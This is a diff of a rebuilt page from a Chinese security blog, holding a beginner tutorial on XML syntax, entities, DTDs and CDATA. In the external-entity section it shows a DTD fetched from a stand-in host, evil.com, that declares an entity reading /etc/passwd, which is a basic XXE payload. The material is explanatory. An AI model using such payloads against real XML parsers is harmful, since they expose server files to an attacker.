@@ -1,113 +1,21 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>XML 基础 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>XML 基础</h1>
-      
-<div class="post-meta">
-    <time>2016-05-25</time>
-    
-    [<a href="/categories/Other">Other</a>](<a href="/tags/xml">xml</a>)
-</div>
-
-      <div><h3 id="0x00-xml简介">0x00 XML简介</h3>
-<p>1、xml的设计宗旨是传输数据，而并非显示数据<br>
-2、xms是不作为的，它被设计用来结构化、存储以及传输信息<br>
-3、xml只是纯文本，独立于软硬件和应用程序<br>
-4、xml可供任何软硬设备读取数据<br>
-5、xml可以自定义标签<br>
-6、xml具有自我描述性<br>
-7、xml是对html的补充<br>
-8、xml常用于简化数据的存储和共享</p>
-<h3 id="0x01-xml语法规则">0x01 XML语法规则</h3>
-<p>1、所有元素必有闭合标签<br>
-2、标签对大小写敏感<br>
-3、必须正确的嵌套<br>
-4、XML必须有根元素，根节点可以有子节点<br>
-5、XML的属性值必须加引号(能用子元素的就用子元素代替属性)<br>
-6、空格会被保留<br>
-7、XML以LF存储换行<br>
-8、注释使用<code>&lt;!--   --&gt;</code><br>
-9、实体引用</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&amp;lt;  &lt;   <span style="color:#f92672">小于</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&amp;</span><span style="color:#a6e22e">gt</span><span style="color:#960050;background-color:#1e0010">;</span>  &gt;   大于
-</span></span><span style="display:flex;"><span>&amp;amp;   <span style="color:#960050;background-color:#1e0010">&amp;</span>   和号
-</span></span><span style="display:flex;"><span>&amp;apos;  &#39;   单引号
-</span></span><span style="display:flex;"><span>&amp;quot;  &#34;   引号
-</span></span></code></pre></div><h3 id="0x02-xml格式">0x02 XML格式</h3>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;  &lt;!--xml声明--&gt;
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>XML 基础 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>XML 基础</h1><div class=post-meta><time>2016-05-25</time>
+[<a href=/categories/Other>Other</a>](<a href=/tags/xml>xml</a>)</div><div><h3 id=0x00-xml简介>0x00 XML简介</h3><p>1、xml的设计宗旨是传输数据，而并非显示数据<br>2、xms是不作为的，它被设计用来结构化、存储以及传输信息<br>3、xml只是纯文本，独立于软硬件和应用程序<br>4、xml可供任何软硬设备读取数据<br>5、xml可以自定义标签<br>6、xml具有自我描述性<br>7、xml是对html的补充<br>8、xml常用于简化数据的存储和共享</p><h3 id=0x01-xml语法规则>0x01 XML语法规则</h3><p>1、所有元素必有闭合标签<br>2、标签对大小写敏感<br>3、必须正确的嵌套<br>4、XML必须有根元素，根节点可以有子节点<br>5、XML的属性值必须加引号(能用子元素的就用子元素代替属性)<br>6、空格会被保留<br>7、XML以LF存储换行<br>8、注释使用<code>&lt;!-- --></code><br>9、实体引用</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&amp;lt;  &lt;   <span style=color:#f92672>小于</span>
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&amp;</span><span style=color:#a6e22e>gt</span><span style=color:#960050;background-color:#1e0010>;</span>  &gt;   大于
+</span></span><span style=display:flex><span>&amp;amp;   <span style=color:#960050;background-color:#1e0010>&amp;</span>   和号
+</span></span><span style=display:flex><span>&amp;apos;  &#39;   单引号
+</span></span><span style=display:flex><span>&amp;quot;  &#34;   引号
+</span></span></code></pre></div><h3 id=0x02-xml格式>0x02 XML格式</h3><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;  &lt;!--xml声明--&gt;
 
 &lt;!--文档类型定义--&gt;
 &lt;!DOCTYPE note [
@@ -125,17 +33,14 @@
   &lt;heading&gt;Reminder&lt;/heading&gt;
   &lt;body&gt;Hi,I’am John&lt;/body&gt;
 &lt;/note&gt;
-</code></pre><h3 id="0x03-xml示例">0x03 XML示例</h3>
-<p>例子一：John给George的便签</p>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</code></pre><h3 id=0x03-xml示例>0x03 XML示例</h3><p>例子一：John给George的便签</p><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
 &lt;note&gt;   &lt;!-- 根元素 --&gt;
   &lt;to&gt;George&lt;/to&gt;
   &lt;from&gt;John&lt;/from&gt;
   &lt;heading&gt;Reminder&lt;/heading&gt;
   &lt;body&gt;Don&#39;t forget the meeting!&lt;/body&gt;
 &lt;/note&gt;
-</code></pre><p>例子二：传输数据</p>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</code></pre><p>例子二：传输数据</p><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
 &lt;books&gt;
   &lt;book&gt;
     &lt;name&gt;Python黑帽子&lt;/name&gt;
@@ -153,10 +58,7 @@
     讲述web渗透的基础知识
   &lt;/description&gt;
 &lt;/books&gt;
-</code></pre><h3 id="0x04-xml属性">0x04 XML属性</h3>
-<p>对于xml要尽量避免使用属性，作为数据的都尽量使用标签，作为标识的可以作为属性，<br>
-下面两种xml文档包含信息相同，但是推荐第二种</p>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</code></pre><h3 id=0x04-xml属性>0x04 XML属性</h3><p>对于xml要尽量避免使用属性，作为数据的都尽量使用标签，作为标识的可以作为属性，<br>下面两种xml文档包含信息相同，但是推荐第二种</p><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
 &lt;messages date=&#34;28/08/2008&#34;&gt;
   &lt;note id=&#34;501&#34;&gt; &lt;!-- ID仅仅是一个标识符，用于标识不同的便签。--&gt;
     &lt;to&gt;George&lt;/to&gt;
@@ -171,7 +73,7 @@
     &lt;body&gt;I will not&lt;/body&gt;
   &lt;/note&gt; 
 &lt;/messages&gt;
-</code></pre><pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</code></pre><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
 &lt;messages&gt;
   &lt;date&gt;28/08/2008&lt;/date&gt; &lt;!-- date作为数据，所以写入到标签中 --&gt;
   &lt;note id=&#34;501&#34;&gt;
@@ -187,68 +89,27 @@
     &lt;body&gt;I will not&lt;/body&gt;
   &lt;/note&gt; 
 &lt;/messages&gt;
-</code></pre><h3 id="0x05-使用实体">0x05 使用实体</h3>
-<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明。<br>
-XML实体分为四种：字符实体，命名实体，外部实体，参数实体。<br>
-可以利用DTD来内部或外部引入实体，DTT基本格式：<!DOCTYPE 根元素名 [  元素描述   ]></p>
-<ul>
-<li>内部引入</li>
-</ul>
-<p>格式：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</code></pre><h3 id=0x05-使用实体>0x05 使用实体</h3><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明。<br>XML实体分为四种：字符实体，命名实体，外部实体，参数实体。<br>可以利用DTD来内部或外部引入实体，DTT基本格式：<!doctype html></p><ul><li>内部引入</li></ul><p>格式：<code>&lt;!ENTITY 实体名称 "实体的值"></code></p><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
 &lt;!DOCTYPE test [
     &lt;!ENTITY abc &#34;Hello World!&#34;&gt;
 ]&gt;
 &lt;root&gt;
     &amp;abc;
 &lt;/root&gt;
-</code></pre><ul>
-<li>外部引入</li>
-</ul>
-<p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code></p>
-<p>evil.dtd中的内容为<code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</code></pre><ul><li>外部引入</li></ul><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM "URI"></code></p><p>evil.dtd中的内容为<code>&lt;!ENTITY b SYSTEM "file:///etc/passwd"></code></p><pre tabindex=0><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
 &lt;!DOCTYPE test [
     &lt;!ENTITY a SYSTEM &#34;http://evil.com/evil.dtd&#34;&gt;
 ]&gt;
 &lt;root&gt;
     &amp;b;
 &lt;/root&gt;
-</code></pre><h3 id="0x06cdata">0x06　CDATA</h3>
-<p>在 XML 元素中，&quot;&lt;&quot; 和 &ldquo;&amp;&rdquo; 是非法的。<br>
-&ldquo;&lt;&rdquo; 会产生错误，因为解析器会把该字符解释为新元素的开始。<br>
-&ldquo;&amp;&rdquo; 也会产生错误，因为解析器会把该字符解释为字符实体的开始。<br>
-为了避免错误，可以将脚本代码定义为CDATA，CDATA部分中的所有内容都会被解析器忽略。</p>
-<pre tabindex="0"><code>&lt;![CDATA[ &lt;script&gt;alert(&#34;test&#34;);&lt;/script&gt; ]]&gt;
-</code></pre></div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre><h3 id=0x06cdata>0x06　CDATA</h3><p>在 XML 元素中，"&lt;" 和 &ldquo;&&rdquo; 是非法的。<br>&ldquo;&lt;&rdquo; 会产生错误，因为解析器会把该字符解释为新元素的开始。<br>&ldquo;&&rdquo; 也会产生错误，因为解析器会把该字符解释为字符实体的开始。<br>为了避免错误，可以将脚本代码定义为CDATA，CDATA部分中的所有内容都会被解析器忽略。</p><pre tabindex=0><code>&lt;![CDATA[ &lt;script&gt;alert(&#34;test&#34;);&lt;/script&gt; ]]&gt;
+</code></pre></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
